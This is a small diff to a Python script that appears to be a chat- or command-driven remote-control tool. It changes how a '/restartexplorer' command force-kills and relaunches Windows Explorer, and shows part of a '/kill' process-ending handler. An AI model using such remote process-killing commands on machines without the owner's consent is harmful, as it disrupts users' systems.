@@ -1249,7 +1249,11 @@ def send_data(message=None):
 
     elif message.startswith('/restartexplorer'):
         subprocess.Popen('taskkill /f /im explorer.exe', shell=True)
-        subprocess.Popen('start explorer.exe', shell=True)
+        time.sleep(0.5)
+        os.startfile('explorer.exe')
+        hwnd = get_window_by_name('explorer.exe')
+        if hwnd:
+            close_window(hwnd)
 
     elif message.startswith(('/kill', '/taskill', '/taskkill', '/forceclose')):
         window_name = message.replace('/kill', '').replace('/taskill', '').replace('/taskkill', '').replace('/forceclose', '')
